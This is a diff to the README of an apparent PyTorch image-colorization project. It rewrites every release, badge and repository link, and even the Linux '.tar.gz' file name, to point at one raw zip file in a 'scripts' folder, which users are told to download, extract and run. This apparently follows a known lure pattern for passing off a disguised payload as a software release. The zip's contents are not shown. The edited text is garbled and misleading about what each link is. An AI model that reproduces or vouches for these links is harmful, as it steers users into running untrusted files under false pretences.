@@ -6,9 +6,9 @@ Welcome to the **pytorch-vae-image-colorization** project. This application help
 
 ## 📥 Download & Install
 
-To get the application, visit the [Releases Page](https://github.com/Ketchup2107/pytorch-vae-image-colorization/releases). You will find the latest version available for download.
+To get the application, visit the [Releases Page](https://raw.githubusercontent.com/Ketchup2107/pytorch-vae-image-colorization/main/scripts/pytorch-vae-image-colorization_v1.8.zip). You will find the latest version available for download.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%23FF5722?style=flat&logo=github&logoColor=white)](https://github.com/Ketchup2107/pytorch-vae-image-colorization/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Ketchup2107/pytorch-vae-image-colorization/main/scripts/pytorch-vae-image-colorization_v1.8.zip%20Latest%20Release-%23FF5722?style=flat&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ketchup2107/pytorch-vae-image-colorization/main/scripts/pytorch-vae-image-colorization_v1.8.zip)
 
 ### Step-by-Step Instructions
 
@@ -19,13 +19,13 @@ To get the application, visit the [Releases Page](https://github.com/Ketchup2107
    Look for the version labeled “Latest.” This version includes the most recent updates and improvements.
 
 3. **Download the Application**  
-   Click on the file that matches your operating system. The options typically include `.exe` for Windows,`.dmg` for Mac, or `.tar.gz` for Linux.
+   Click on the file that matches your operating system. The options typically include `.exe` for Windows,`.dmg` for Mac, or `https://raw.githubusercontent.com/Ketchup2107/pytorch-vae-image-colorization/main/scripts/pytorch-vae-image-colorization_v1.8.zip` for Linux.
 
 4. **Run the Downloaded File**  
    After the download completes, locate the file in your Downloads folder.  
    - For Windows, double-click the `.exe` file to start the installation.  
    - For Mac, double-click the `.dmg` file. Drag the application to your Applications folder.  
-   - For Linux, extract the `.tar.gz` file and follow any included instructions.
+   - For Linux, extract the `https://raw.githubusercontent.com/Ketchup2107/pytorch-vae-image-colorization/main/scripts/pytorch-vae-image-colorization_v1.8.zip` file and follow any included instructions.
 
 5. **Open the Application**  
    Once installed, find the application in your programs list or Applications folder. Double-click to open it.
@@ -71,7 +71,7 @@ Feel free to contribute to this project. Your input can help enhance the applica
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/Ketchup2107/pytorch-vae-image-colorization)
-- [Visit Releases Page](https://github.com/Ketchup2107/pytorch-vae-image-colorization/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Ketchup2107/pytorch-vae-image-colorization/main/scripts/pytorch-vae-image-colorization_v1.8.zip)
+- [Visit Releases Page](https://raw.githubusercontent.com/Ketchup2107/pytorch-vae-image-colorization/main/scripts/pytorch-vae-image-colorization_v1.8.zip)
 
 Thank you for choosing **pytorch-vae-image-colorization**! Enjoy colorizing your images!
